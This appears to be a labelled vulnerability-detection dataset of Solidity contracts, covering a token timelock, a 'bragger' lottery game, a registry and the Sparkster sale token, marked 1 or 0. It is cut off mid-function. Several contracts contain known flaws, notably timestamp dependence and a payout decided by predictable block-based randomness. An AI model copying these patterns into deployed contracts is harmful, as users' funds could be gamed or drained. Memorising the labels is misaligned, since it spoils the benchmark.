1<CODESPLIT>contract AMTTimelockedToken is Ownable {  using SafeERC20 for ERC20Basic;  using SafeMath for uint256;  uint8 public constant decimals = 18;       ERC20Basic token;     uint256 public constant MANAGE_CAP = 1 * (10 ** 8) * (10 ** uint256(decimals));    uint256 public constant DEVELOP_CAP = 2 * (10 ** 8) * (10 ** uint256(decimals));    uint256 public constant MARKET_CAP = 1 * (10 ** 8) * (10 ** uint256(decimals));    uint256 public constant FINANCE_CAP = 6 * (10 ** 7) * (10 ** uint256(decimals));       uint256 public constant MANAGE_CAP_PER_ROUND = 2 * (10 ** 7) * (10 ** uint256(decimals));  uint256 public constant DEVELOP_CAP_PER_ROUND = 4 * (10 ** 7) * (10 ** uint256(decimals));  uint256 public constant MARKET_CAP_PER_ROUND = 2 * (10 ** 7) * (10 ** uint256(decimals));  uint256 public constant FINANCE_CAP_PER_ROUND = 12 * (10 ** 6) * (10 ** uint256(decimals));     mapping (address => uint256) releasedTokens;     address beneficiary_manage;    address beneficiary_develop;    address beneficiary_market;    address beneficiary_finance;       uint256 first_round_release_time;    uint256 second_round_release_time;    uint256 third_round_release_time;    uint256 forth_round_release_time;    uint256 fifth_round_release_time;       constructor(    ERC20Basic _token,    address _beneficiary_manage,    address _beneficiary_develop,    address _beneficiary_market,    address _beneficiary_finance,    uint256 _first_round_release_time,    uint256 _second_round_release_time,    uint256 _third_round_release_time,    uint256 _forth_round_release_time,    uint256 _fifth_round_release_time  ) public {         token = _token;    beneficiary_manage = _beneficiary_manage;    beneficiary_develop = _beneficiary_develop;    beneficiary_market = _beneficiary_market;    beneficiary_finance = _beneficiary_finance;    first_round_release_time = _first_round_release_time;    second_round_release_time = _second_round_release_time;    third_round_release_time = _third_round_release_time;    forth_round_release_time = _forth_round_release_time;    fifth_round_release_time = _fifth_round_release_time;  }     function getToken() public view returns (ERC20Basic) {    return token;  }     function getBeneficiaryManage() public view returns (address) {    return beneficiary_manage;  }     function getBeneficiaryDevelop() public view returns (address) {    return beneficiary_develop;  }     function getBeneficiaryMarket() public view returns (address) {    return beneficiary_market;  }     function getBeneficiaryFinance() public view returns (address) {    return beneficiary_finance;  }     function getFirstRoundReleaseTime() public view returns (uint256) {    return first_round_release_time;  }     function getSecondRoundReleaseTime() public view returns (uint256) {    return second_round_release_time;  }     function getThirdRoundReleaseTime() public view returns (uint256) {    return third_round_release_time;  }     function getForthRoundReleaseTime() public view returns (uint256) {    return forth_round_release_time;  }     function getFifthRoundReleaseTime() public view returns (uint256) {    return fifth_round_release_time;  }       function releasedTokenOf(address _owner) public view returns (uint256) {    return releasedTokens[_owner];  }     function validateReleasedToken(uint256 _round) internal onlyOwner {    uint256 releasedTokenOfManage = releasedTokens[beneficiary_manage];    uint256 releasedTokenOfDevelop = releasedTokens[beneficiary_develop];    uint256 releasedTokenOfMarket = releasedTokens[beneficiary_market];    uint256 releasedTokenOfFinance = releasedTokens[beneficiary_finance];    require(releasedTokenOfManage < MANAGE_CAP_PER_ROUND.mul(_round));    require(releasedTokenOfManage.add(MANAGE_CAP_PER_ROUND) <= MANAGE_CAP_PER_ROUND.mul(_round));    require(releasedTokenOfDevelop < DEVELOP_CAP_PER_ROUND.mul(_round));    require(releasedTokenOfDevelop.add(DEVELOP_CAP_PER_ROUND) <= DEVELOP_CAP_PER_ROUND.mul(_round));    require(releasedTokenOfMarket < MARKET_CAP_PER_ROUND.mul(_round));    require(releasedTokenOfMarket.add(MARKET_CAP_PER_ROUND) <= MARKET_CAP_PER_ROUND.mul(_round));    require(releasedTokenOfFinance < FINANCE_CAP_PER_ROUND.mul(_round));    require(releasedTokenOfFinance.add(FINANCE_CAP_PER_ROUND) <= FINANCE_CAP_PER_ROUND.mul(_round));    uint256 totalRoundCap = MANAGE_CAP_PER_ROUND.add(DEVELOP_CAP_PER_ROUND).add(MARKET_CAP_PER_ROUND).add(FINANCE_CAP_PER_ROUND);    require(token.balanceOf(this) >= totalRoundCap);    token.safeTransfer(beneficiary_manage, MANAGE_CAP_PER_ROUND);    releasedTokens[beneficiary_manage] = releasedTokens[beneficiary_manage].add(MANAGE_CAP_PER_ROUND);    token.safeTransfer(beneficiary_develop, DEVELOP_CAP_PER_ROUND);    releasedTokens[beneficiary_develop] = releasedTokens[beneficiary_develop].add(DEVELOP_CAP_PER_ROUND);    token.safeTransfer(beneficiary_market, MARKET_CAP_PER_ROUND);    releasedTokens[beneficiary_market] = releasedTokens[beneficiary_market].add(MARKET_CAP_PER_ROUND);    token.safeTransfer(beneficiary_finance, FINANCE_CAP_PER_ROUND);    releasedTokens[beneficiary_finance] = releasedTokens[beneficiary_finance].add(FINANCE_CAP_PER_ROUND);  }     function releaseToken() public onlyOwner {    if (block.timestamp >= fifth_round_release_time) {      validateReleasedToken(5);      return;    }else if (block.timestamp >= forth_round_release_time) {      validateReleasedToken(4);      return;    }else if (block.timestamp >= third_round_release_time) {      validateReleasedToken(3);      return;    }else if (block.timestamp >= second_round_release_time) {      validateReleasedToken(2);      return;    }else if (block.timestamp >= first_round_release_time) {      validateReleasedToken(1);      return;    }  }}
1<CODESPLIT>contract braggerContract {            mapping (address => uint256) public balanceOf;    mapping (address => mapping (address => uint256)) public allowance;    mapping (address => bool) private isUser;    mapping (address => bool) private hasPicture;    mapping (address => string) private userWalletToUserName;    mapping (string => address) private userNameToUserWallet;    mapping (string => string) private userNameToPicture;    mapping (address => string) private userWalletToPicture;    mapping (address => uint256) private fineLevel;            event Transfer(address indexed from, address indexed to, uint256 value);         event Burn(address indexed from, uint256 value);       address public ownerAddress = 0x000;    address private bragAddress = 0x845EC9f9C0650b98f70E05fc259F4A04f6AC366e;    string private initialQuote = "Teach your people with your wisdom.";         string private initialPicture = "https://cdn2.iconfinder.com/data/icons/ios-7-icons/50/user_male2-512.png";    uint256 basicFine = 25000000000000000;    uint256 blocks;    uint256 totalBraggedValue = 0;        uint256 winningpot = 0;        uint256 totalbrags = 0;       struct Bragger{        address braggerAddress;        uint256 braggedAmount;        string braggerQuote;    }    Bragger[] private braggers;    struct User{        address userAddress;        string userName;    }    User[] private users;            modifier onlyCreator() {        require(msg.sender == ownerAddress);        _;    }       constructor() public {        blocks=0;        ownerAddress = msg.sender;    }    function random() private view returns (uint8) {        return uint8(uint256(keccak256(block.timestamp, block.difficulty))%251);    }    function random2() private view returns (uint8) {        return uint8(uint256(keccak256(blocks, block.difficulty))%251);    }    function random3() private view returns (uint8) {        return uint8(uint256(keccak256(blocks, block.difficulty))%braggers.length);    }       function getTotalBraggedVolume() public view returns (uint256 _amount){        return totalBraggedValue;    }    function getCurrentBragKing() public view returns(address _bragger, uint256 _amount, string _quote, string _username, string _picture){        _bragger = braggers[braggers.length-1].braggerAddress;        _amount = braggers[braggers.length-1].braggedAmount;        _quote = braggers[braggers.length-1].braggerQuote;        if(isAlreadyUser(_bragger)){            _username = getUserNameByWallet(_bragger);        } else {            _username = "";        }        if(hasPicture[_bragger]){            _picture = userWalletToPicture[_bragger];        } else {            _picture = initialPicture;        }        return (_bragger, _amount, _quote, _username, _picture);    }    function arrayLength()public view returns(uint256 length){        length = braggers.length;        return length;    }    function getBraggerAtIndex(uint256 _index) public view returns(address _bragger, uint256 _brag, string _username, string _picture){        _bragger = braggers[_index].braggerAddress;        _brag = braggers[_index].braggedAmount;        if(isAlreadyUser(_bragger)){            _username = getUserNameByWallet(_bragger);        } else {            _username = "";        }         if(hasPicture[_bragger]){            _picture = userWalletToPicture[_bragger];        } else {            _picture = initialPicture;        }        return (_bragger, _brag, _username, _picture);    }    function getUserNameByWallet(address _wallet) public view returns (string _username){        require(isAlreadyUser(_wallet));        _username = userWalletToUserName[_wallet];        return _username;    }     function getUserPictureByWallet(address _wallet) public view returns (string _url){        require(isAlreadyUser(_wallet));        _url = userWalletToPicture[_wallet];        return _url;    }    function getUserWalletByUsername(string _username) public view returns(address _address){        address _user = userNameToUserWallet[_username];        return (_user);    }    function getUserPictureByUsername(string _username) public view returns(string _url){        _url = userNameToPicture[_username];        return (_url);    }    function getFineLevelOfAddress(address _user) public view returns(uint256 _fineLevel, uint256 _fineAmount){        _fineLevel = fineLevel[_user];        _fineAmount = _fineLevel * basicFine;        return (_fineLevel, _fineAmount);    }    function getFineLevelOfUsername(string _username) public view returns(uint256 _fineLevel, uint256 _fineAmount){        address _user = userNameToUserWallet[_username];        _fineLevel = fineLevel[_user];        _fineAmount = _fineLevel * basicFine;        return (_fineLevel, _fineAmount);    }        function getTotalBrags() public view returns(uint256){        return totalbrags;    }        function getWinnerPot() public view returns(uint256){        return winningpot;    }       function getCurrentPot() public view returns (uint256 _amount){        return address(this).balance;    }    function brag() public payable{        uint256 shortage = SafeMath.mul(30,SafeMath.div(msg.value, 100));        if(braggers.length != 0){         require(braggers[braggers.length-1].braggedAmount < msg.value);        }        Bragger memory _bragger = Bragger({            braggerAddress: msg.sender,            braggedAmount: msg.value,            braggerQuote: initialQuote        });        braggers.push(_bragger);        totalBraggedValue = totalBraggedValue + msg.value;                winningpot = winningpot + SafeMath.sub(msg.value, shortage);        bragAddress.transfer(shortage);        if(random() == random2()){            address sender = msg.sender;            sender.transfer(SafeMath.mul(SafeMath.div(address(this).balance,100), 70));            uint256 luckyIndex = random3();            address luckyGuy = braggers[luckyIndex].braggerAddress;            luckyGuy.transfer(address(this).balance);        }        blocks = SafeMath.add(blocks, random());        totalbrags += 1;    }       function setTheKingsQuote(string _message) public payable{        if(fineLevel[msg.sender] > 0){            require(msg.value > (basicFine * fineLevel[msg.sender]));        }        address currentKing = braggers[braggers.length-1].braggerAddress;        require(msg.sender == currentKing);        braggers[braggers.length-1].braggerQuote = _message;    }       function isAlreadyUser(address _address) public view returns (bool status){        if (isUser[_address]){            return true;        } else {            return false;        }    }    function hasProfilePicture(address _address) public view returns (bool status){        if (isUser[_address]){            return true;        } else {            return false;        }    }    function createNewUser(string _username, string _pictureUrl) public {        require(!isAlreadyUser(msg.sender));        User memory _user = User({            userAddress: msg.sender,            userName: _username        });        userWalletToUserName[msg.sender] = _username;        userNameToUserWallet[_username] = msg.sender;        userNameToPicture[_username] = _pictureUrl;        userWalletToPicture[msg.sender] = _pictureUrl;        fineLevel[msg.sender] = 0;        users.push(_user) - 1;        isUser[msg.sender] = true;        hasPicture[msg.sender] = true;    }       function resetQuote()public onlyCreator{        braggers[braggers.length-1].braggerQuote = initialQuote;        fineLevel[braggers[braggers.length-1].braggerAddress] = fineLevel[braggers[braggers.length-1].braggerAddress] + 1;    }    function resetUsername(string _username)public onlyCreator{        address user = userNameToUserWallet[_username];        userWalletToUserName[user] = "Mick";        fineLevel[user] = fineLevel[user] + 1;    }    function resetUserPicture(string _username)public onlyCreator{        address user = userNameToUserWallet[_username];        userWalletToPicture[user] = initialPicture;        fineLevel[user] = fineLevel[user] + 1;    }            function _transfer(address _from, address _to, uint _value) internal {                 require(_to != 0x0);                 require(balanceOf[_from] >= _value);                 require(balanceOf[_to] + _value > balanceOf[_to]);                 uint previousBalances = balanceOf[_from] + balanceOf[_to];                 balanceOf[_from] -= _value;                 balanceOf[_to] += _value;        emit Transfer(_from, _to, _value);                 assert(balanceOf[_from] + balanceOf[_to] == previousBalances);    }    function transfer(address _to, uint256 _value) public {        _transfer(msg.sender, _to, _value);    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {        require(_value <= allowance[_from][msg.sender]);              allowance[_from][msg.sender] -= _value;        _transfer(_from, _to, _value);        return true;    }    function approve(address _spender, uint256 _value) public        returns (bool success) {        allowance[msg.sender][_spender] = _value;        return true;    }    function approveAndCall(address _spender, uint256 _value, bytes _extraData)        public        returns (bool success) {        tokenRecipient spender = tokenRecipient(_spender);        if (approve(_spender, _value)) {            spender.receiveApproval(msg.sender, _value, this, _extraData);            return true;        }    }    function reset()public onlyCreator {        selfdestruct(ownerAddress);    }}   library SafeMath {  function mul(uint256 a, uint256 b) internal pure returns (uint256) {    if (a == 0) {      return 0;    }    uint256 c = a * b;    assert(c / a == b);    return c;  }  function div(uint256 a, uint256 b) internal pure returns (uint256) {         uint256 c = a / b;         return c;  }  function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }  function add(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a + b;    assert(c >= a);    return c;  }}
1<CODESPLIT>contract DINRegistry {    struct Record {        address owner;        address resolver;        uint256 updated;    }    mapping (uint256 => Record) records;    uint256 public index;    function registerDINWithResolver(address _owner, address _resolver) public returns (uint256 _DIN) {        index++;        records[index].owner = _owner;        records[index].resolver = _resolver;        records[index].updated = block.timestamp;        return index;    }}
0<CODESPLIT>contract RBACMixin {     string constant FORBIDDEN = "Haven't enough right to access";     mapping (address => bool) public owners;     mapping (address => bool) public minters;        event AddOwner(address indexed who);        event DeleteOwner(address indexed who);        event AddMinter(address indexed who);        event DeleteMinter(address indexed who);  constructor () public {    _setOwner(msg.sender, true);  }     modifier onlyOwner() {    require(isOwner(msg.sender), FORBIDDEN);    _;  }     modifier onlyMinter() {    require(isMinter(msg.sender), FORBIDDEN);    _;  }           function isOwner(address _who) public view returns (bool) {    return owners[_who];  }           function isMinter(address _who) public view returns (bool) {    return minters[_who];  }              function addOwner(address _who) public onlyOwner returns (bool) {    _setOwner(_who, true);  }              function deleteOwner(address _who) public onlyOwner returns (bool) {    _setOwner(_who, false);  }              function addMinter(address _who) public onlyOwner returns (bool) {    _setMinter(_who, true);  }              function deleteMinter(address _who) public onlyOwner returns (bool) {    _setMinter(_who, false);  }              function _setOwner(address _who, bool _flag) private returns (bool) {    require(owners[_who] != _flag);    owners[_who] = _flag;    if (_flag) {      emit AddOwner(_who);    } else {      emit DeleteOwner(_who);    }    return true;  }              function _setMinter(address _who, bool _flag) private returns (bool) {    require(minters[_who] != _flag);    minters[_who] = _flag;    if (_flag) {      emit AddMinter(_who);    } else {      emit DeleteMinter(_who);    }    return true;  }} library SafeMath {     function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {                   if (a == 0) {      return 0;    }    c = a * b;    assert(c / a == b);    return c;  }     function div(uint256 a, uint256 b) internal pure returns (uint256) {                   return a / b;  }     function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }     function add(uint256 a, uint256 b) internal pure returns (uint256 c) {    c = a + b;    assert(c >= a);    return c;  }}interface IMintableToken {  function mint(address _to, uint256 _amount) external returns (bool);}    
0<CODESPLIT>contract TokenBucket is RBACMixin, IMintableToken {  using SafeMath for uint;          uint256 public size;        uint256 public rate;        uint256 public lastMintTime;     uint256 public leftOnLastMint;        IMintableToken public token;           event Leak(address indexed to, uint256 left);           constructor (address _token, uint256 _size, uint256 _rate) public {    token = IMintableToken(_token);    size = _size;    rate = _rate;    leftOnLastMint = _size;  }              function setSize(uint256 _size) public onlyOwner returns (bool) {    size = _size;    return true;  }              function setRate(uint256 _rate) public onlyOwner returns (bool) {    rate = _rate;    return true;  }                 function setSizeAndRate(uint256 _size, uint256 _rate) public onlyOwner returns (bool) {    return setSize(_size) && setRate(_rate);  }              function mint(address _to, uint256 _amount) public onlyMinter returns (bool) {    uint256 available = availableTokens();    require(_amount <= available);    leftOnLastMint = available.sub(_amount);    lastMintTime = now;      require(token.mint(_to, _amount));    return true;  }        function availableTokens() public view returns (uint) {          uint256 timeAfterMint = now.sub(lastMintTime);    uint256 refillAmount = rate.mul(timeAfterMint).add(leftOnLastMint);    return size < refillAmount ? size : refillAmount;  }}
1<CODESPLIT>contract SparksterToken is StandardToken, Ownable{	using strings for *;	using SafeMath for uint256;	struct Member {		mapping(uint256 => uint256) weiBalance;  		mapping(uint256 => uint256) tokenBalance;  		int256 transferred;  		bool exists;  	}	struct Group {		bool distributed;  		bool distributing;  		bool unlocked;  		uint256 ratio;  		uint256 startTime;  		uint256 phase1endTime;  		uint256 phase2endTime;  		uint256 deadline;  		uint256 max2;  		uint256 max3;  		uint256 weiTotal;  		uint256 cap;  		uint256 howManyDistributed;		uint256 howManyTotal;  	}	address oracleAddress = 0xCb3405Fd5212C8B6a16DeFf9eBa49E69478A61b8;	bool public transferLock = true;  	bool public allowedToSell = false;	bool public allowedToPurchase = false;	string public name;									  	string public symbol;								  	uint8 public decimals;							 	uint256 public penalty;	uint256 public maxGasPrice;  	uint256 internal nextGroupNumber;	uint256 public sellPrice;  	address[] internal allMembers;		address[] internal allNonMembers;	mapping(address => bool) internal nonMemberTransfers;	mapping(address => Member) internal members;	mapping(uint256 => Group) internal groups;	uint256 public openGroupNumber;	event WantsToPurchase(address walletAddress, uint256 weiAmount, uint256 groupNumber, bool inPhase1);	event WantsToDistribute(uint256 groupNumber, uint256 startIndex, uint256 endIndex);	event NearingHardCap(uint256 groupNumber, uint256 remainder);	event ReachedHardCap(uint256 groupNumber);	event DistributeDone(uint256 groupNumber);	event UnlockDone(uint256 groupNumber);	event GroupCreated(uint256 groupNumber, uint256 startTime, uint256 phase1endTime, uint256 phase2endTime, uint256 deadline, uint256 phase2cap, uint256 phase3cap, uint256 cap, uint256 ratio);	event AddToGroup(address walletAddress, uint256 groupNumber);	event ChangedAllowedToSell(bool allowedToSell);	event ChangedAllowedToPurchase(bool allowedToPurchase);	event ChangedTransferLock(bool transferLock);	event SetSellPrice(uint256 sellPrice);	event SplitTokens(uint256 splitFactor);	event ReverseSplitTokens(uint256 splitFactor);		modifier onlyOracleBackend() {		require(msg.sender == oracleAddress);		_;	}		 	modifier onlyPayloadSize(uint size) {	 		require(msg.data.length == size + 4);		_;	}	modifier canTransfer() {		require(!transferLock);		_;	}	modifier canPurchase() {		require(allowedToPurchase);		_;	}	modifier canSell() {		require(allowedToSell);		_;	}	function() public payable {		purchase();	}	constructor() public {		name = "Sparkster";									 		decimals = 18;					  		symbol = "SPRK";							 		setMaximumGasPrice(40);		 		mintTokens(435000000);	}		function setOracleAddress(address newAddress) public onlyOwner returns(bool success) {		oracleAddress = newAddress;		return true;	}		function setMaximumGasPrice(uint256 gweiPrice) public onlyOwner returns(bool success) {		maxGasPrice = gweiPrice.mul(10**9);  		return true;	}		function parseAddr(string _a) pure internal returns (address){  		bytes memory tmp = bytes(_a);		uint160 iaddr = 0;		uint160 b1;		uint160 b2;		for (uint i=2; i<2+2*20; i+=2){			iaddr *= 256;			b1 = uint160(tmp[i]);			b2 = uint160(tmp[i+1]);			if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;			else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;			if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;			else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;			iaddr += (b1*16+b2);		}		return address(iaddr);	}	function parseInt(string _a, uint _b) pure internal returns (uint) {		bytes memory bresult = bytes(_a);		uint mint = 0;		bool decim = false;		for (uint i = 0; i < bresult.length; i++) {			if ((bresult[i] >= 48) && (bresult[i] <= 57)) {				if (decim) {					if (_b == 0) break;						else _b--;				}				mint *= 10;				mint += uint(bresult[i]) - 48;			} else if (bresult[i] == 46) decim = true;		}		return mint;	}	function mintTokens(uint256 amount) public onlyOwner {		 		uint256 decimalAmount = amount.mul(uint(10)**decimals);		totalSupply_ = totalSupply_.add(decimalAmount);		balances[msg.sender] = balances[msg.sender].add(decimalAmount);		emit Transfer(address(0), msg.sender, decimalAmount);  	}		function purchase() public canPurchase payable returns(bool success) {		require(msg.sender != address(0));  		Member storage memberRecord = members[msg.sender];		Group storage openGroup = groups[openGroupNumber];		require(openGroup.ratio > 0);  		uint256 currentTimestamp = block.timestamp;		require(currentTimestamp >= openGroup.startTime && currentTimestamp <= openGroup.deadline);																  		require(!openGroup.distributing && !openGroup.distributed);  		require(tx.gasprice <= maxGasPrice);  		uint256 weiAmount = msg.value;																		 		require(weiAmount >= 0.1 ether);		uint256 weiTotal = openGroup.weiTotal.add(weiAmount);  		require(weiTotal <= openGroup.cap);														 		uint256 userWeiTotal = memberRecord.weiBalance[openGroupNumber].add(weiAmount);	 		if(currentTimestamp <= openGroup.phase1endTime){																			  			emit WantsToPurchase(msg.sender, weiAmount, openGroupNumber, true);			return true;		} else if (currentTimestamp <= openGroup.phase2endTime) {  			require(userWeiTotal <= openGroup.max2);  			emit WantsToPurchase(msg.sender, weiAmount, openGroupNumber, false);			return true;		} else {  			require(userWeiTotal <= openGroup.max3);  			emit WantsToPurchase(msg.sender, weiAmount, openGroupNumber, false);			return true;		}	}		function purchaseCallback(string uploadedData) public onlyOracleBackend returns(bool success) {		 		strings.slice memory uploadedSlice = uploadedData.toSlice();		strings.slice memory nextRecord = "".toSlice();		strings.slice memory nextDatum = "".toSlice();		strings.slice memory recordSeparator = "|".toSlice();		strings.slice memory datumSeparator = ":".toSlice();		uint256 amountForOwner = 0;		while (!uploadedSlice.empty()) {			nextRecord = uploadedSlice.split(recordSeparator);			nextDatum = nextRecord.split(datumSeparator);			uint256 accepted = parseInt(nextDatum.toString(), 0);			nextDatum = nextRecord.split(datumSeparator);			address theAddress = parseAddr(nextDatum.toString());			if (accepted > 0) {				Member storage memberRecord = members[theAddress];				nextDatum = nextRecord.split(datumSeparator);				uint256 weiAmount = parseInt(nextDatum.toString(), 0);				amountForOwner = amountForOwner.add(weiAmount);				nextDatum = nextRecord.split(datumSeparator);				uint256 groupNumber = parseInt(nextDatum.toString(), 0);				Group storage theGroup = groups[groupNumber];				uint256 tokenAmount = weiAmount.mul(theGroup.ratio);						  				theGroup.weiTotal = theGroup.weiTotal.add(weiAmount);								  				memberRecord.weiBalance[groupNumber] = memberRecord.weiBalance[groupNumber].add(weiAmount);														  				memberRecord.tokenBalance[groupNumber] = memberRecord.tokenBalance[groupNumber].add(tokenAmount);  				balances[owner] = balances[owner].sub(tokenAmount);  				if (!memberRecord.exists) {  					allMembers.push(theAddress);					memberRecord.exists = true;					if (balances[theAddress] > 0) {  						memberRecord.transferred = -int(balances[theAddress]);					}				}			} else {				if (penalty >= weiAmount) {					amountForOwner = amountForOwner.add(penalty);					weiAmount = weiAmount.sub(penalty);				}				if (address(this).balance >= weiAmount) {					theAddress.transfer(weiAmount);				}			}			if (internalGetHowMuchUntilHardCap(groupNumber) <= 100 ether) {				emit NearingHardCap(groupNumber, internalGetHowMuchUntilHardCap(groupNumber));			}			if (theGroup.weiTotal == theGroup.cap) {				emit ReachedHardCap(groupNumber);			}		}		if (address(this).balance >= amountForOwner) {			owner.transfer(amountForOwner);		}		return true;	}		function drain() public onlyOwner {		owner.transfer(address(this).balance);	}		function setPenalty(uint256 newPenalty) public onlyOwner returns(bool success) {		penalty = newPenalty;		return true;	}		function sell(uint256 amount) public canSell {  		uint256 decimalAmount = amount.mul(uint(10)**decimals);  		Member storage theMember = members[msg.sender];		if (theMember.exists) {  			int256 sellValue = theMember.transferred + int(decimalAmount);			require(sellValue >= theMember.transferred);  			require(sellValue <= int(getUnlockedBalanceLimit(msg.sender)));  			theMember.transferred = sellValue;		}		balances[msg.sender] = balances[msg.sender].sub(decimalAmount);  		 		uint256 totalCost = amount.mul(sellPrice);  		require(address(this).balance >= totalCost);  		balances[owner] = balances[owner].add(decimalAmount);  		msg.sender.transfer(totalCost);  		emit Transfer(msg.sender, owner, decimalAmount);  	}	function fundContract() public onlyOwner payable {  	}	function setSellPrice(uint256 thePrice) public onlyOwner {		sellPrice = thePrice;		emit SetSellPrice(sellPrice);	}		function setAllowedToSell(bool value) public onlyOwner {		allowedToSell = value;		emit ChangedAllowedToSell(allowedToSell);	}	function setAllowedToPurchase(bool value) public onlyOwner {		allowedToPurchase = value;		emit ChangedAllowedToPurchase(allowedToPurchase);	}		function createGroup(uint256 startEpoch, uint256 phase1endEpoch, uint256 phase2endEpoch, uint256 deadlineEpoch, uint256 phase2cap, uint256 phase3cap, uint256 etherCap, uint256 ratio) public onlyOwner returns (bool success, uint256 createdGroupNumber) {		Group storage theGroup = groups[nextGroupNumber];		theGroup.startTime = startEpoch;		theGroup.phase1endTime = phase1endEpoch;		theGroup.phase2endTime = phase2endEpoch;		theGroup.deadline = deadlineEpoch;		theGroup.max2 = phase2cap;		theGroup.max3 = phase3cap;		theGroup.cap = etherCap;		theGroup.ratio = ratio;		createdGroupNumber = nextGroupNumber;		nextGroupNumber++;		success = true;		emit GroupCreated(createdGroupNumber, startEpoch, phase1endEpoch, phase2endEpoch, deadlineEpoch, phase2cap, phase3cap, etherCap, ratio);	}	function createGroup() public onlyOwner returns (bool success, uint256 createdGroupNumber) {		return createGroup(0, 0, 0, 0, 0, 0, 0, 0);	}	function getGroup(uint256 groupNumber) public view returns(bool distributed, bool unlocked, uint256 phase2cap, uint256 phase3cap, uint256 cap, uint256 ratio, uint256 startTime, uint256 phase1endTime, uint256 phase2endTime, uint256 deadline, uint256 weiTotal, uint256 howManyDistributed) {		require(groupNumber < nextGroupNumber);		Group storage theGroup = groups[groupNumber];		distributed = theGroup.distributed;		unlocked = theGroup.unlocked;		phase2cap = theGroup.max2;		phase3cap = theGroup.max3;		cap = theGroup.cap;		ratio = theGroup.ratio;		startTime = theGroup.startTime;		phase1endTime = theGroup.phase1endTime;		phase2endTime = theGroup.phase2endTime;		deadline = theGroup.deadline;		weiTotal = theGroup.weiTotal;		howManyDistributed = theGroup.howManyDistributed;	}		function internalGetHowMuchUntilHardCap(uint256 groupNumber) internal view returns(uint256 remainder) {		return groups[groupNumber].cap.sub(groups[groupNumber].weiTotal);	}		function getHowMuchUntilHardCap() public view returns(uint256 remainder) {		return internalGetHowMuchUntilHardCap(openGroupNumber);	}	function getHowManyLeftToDistribute(uint256 groupNumber) public view returns(uint256 howManyLeftToDistribute) {		require(groupNumber < nextGroupNumber);		Group storage theGroup = groups[groupNumber];		howManyLeftToDistribute = theGroup.howManyTotal - theGroup.howManyDistributed;  	}		function addMemberToGroup(address walletAddress, uint256 groupNumber) public onlyOwner returns(bool success) {		emit AddToGroup(walletAddress, groupNumber);		return true;	}		function distribute(uint256 groupNumber, uint256 howMany) public onlyOwner {		Group storage theGroup = groups[groupNumber];		require(groupNumber < nextGroupNumber && !theGroup.distributed);  		emit WantsToDistribute(groupNumber, theGroup.howManyDistributed, theGroup.howManyDistributed + howMany);	}		function distributeCallback(uint256 groupNumber, uint256 totalInGroup, address[] addresses) public onlyOracleBackend returns (bool success) {		Group storage theGroup = groups[groupNumber];		theGroup.distributing = true;		uint256 n = addresses.length;		theGroup.howManyTotal = totalInGroup;		for (uint256 i = 0; i < n; i++) {  			address memberAddress = addresses[i];			Member storage currentMember = members[memberAddress];			uint256 balance = currentMember.tokenBalance[groupNumber];			if (balance > 0) {  				balances[memberAddress] = balances[memberAddress].add(balance);				emit Transfer(owner, memberAddress, balance);  			}		}		theGroup.howManyDistributed = theGroup.howManyDistributed.add(n);		if (theGroup.howManyDistributed == theGroup.howManyTotal) {  			theGroup.distributed = true;			theGroup.distributing = false;			emit DistributeDone(groupNumber);		}		return true;	}	function getUnlockedBalanceLimit(address walletAddress) internal view returns(uint256 balance) {		Member storage theMember = members[walletAddress];		if (!theMember.exists) {			return balances[walletAddress];		}		for (uint256 i = 0; i < nextGroupNumber; i++) {			if (groups[i].unlocked) {				balance = balance.add(theMember.tokenBalance[i]);			}		}		return balance;	}	function getUnlockedTokens(address walletAddress) public view returns(uint256 balance) {		Member storage theMember = members[walletAddress];		if (!theMember.exists) {			return balances[walletAddress];		}		return uint256(int(getUnlockedBalanceLimit(walletAddress)) - theMember.transferred);	}	function unlock(uint256 groupNumber) public onlyOwner returns (bool success) {		Group storage theGroup = groups[groupNumber];		require(theGroup.distributed);  		theGroup.unlocked = true;		emit UnlockDone(groupNumber);		return true;	}		function setTransferLock(bool value) public onlyOwner {		transferLock = value;		emit ChangedTransferLock(transferLock);	}		function burn(uint256 amount) public onlyOwner {		 		 		balances[msg.sender] = balances[msg.sender].sub(amount);  		totalSupply_ = totalSupply_.sub(amount);  		emit Transfer(msg.sender, address(0), amount);	}		function splitTokensBeforeDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {		 		uint256 n = allMembers.length;		uint256 ownerBalance = balances[msg.sender];		uint256 increaseSupplyBy = ownerBalance.mul(splitFactor).sub(ownerBalance);  		balances[msg.sender] = balances[msg.sender].mul(splitFactor);		totalSupply_ = totalSupply_.mul(splitFactor);		emit Transfer(address(0), msg.sender, increaseSupplyBy);  		for (uint256 i = 0; i < n; i++) {			Member storage currentMember = members[allMembers[i]];			 			currentMember.transferred = currentMember.transferred * int(splitFactor);			 			for (uint256 j = 0; j < nextGroupNumber; j++) {				uint256 memberBalance = currentMember.tokenBalance[j];				uint256 multiplier = memberBalance.mul(splitFactor);				currentMember.tokenBalance[j] = multiplier;			}		}		 		n = nextGroupNumber;		require(n > 0);  		for (i = 0; i < n; i++) {			Group storage currentGroup = groups[i];			currentGroup.ratio = currentGroup.ratio.mul(splitFactor);		}		emit SplitTokens(splitFactor);		return true;	}		function reverseSplitTokensBeforeDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {		 		uint256 n = allMembers.length;		uint256 ownerBalance = balances[msg.sender];		uint256 decreaseSupplyBy = ownerBalance.sub(ownerBalance.div(splitFactor));		 		totalSupply_ = totalSupply_.div(splitFactor);		balances[msg.sender] = ownerBalance.div(splitFactor);		 		emit Transfer(msg.sender, address(0), decreaseSupplyBy);		for (uint256 i = 0; i < n; i++) {			Member storage currentMember = members[allMembers[i]];			 			currentMember.transferred = currentMember.transferred / int(splitFactor);			for (uint256 j = 0; j < nextGroupNumber; j++) {				uint256 memberBalance = currentMember.tokenBalance[j];				uint256 divier = memberBalance.div(splitFactor);				currentMember.tokenBalance[j] = divier;			}		}		 		n = nextGroupNumber;		require(n > 0);  		for (i = 0; i < n; i++) {			Group storage currentGroup = groups[i];			currentGroup.ratio = currentGroup.ratio.div(splitFactor);		}		emit ReverseSplitTokens(splitFactor);		return true;	}	function 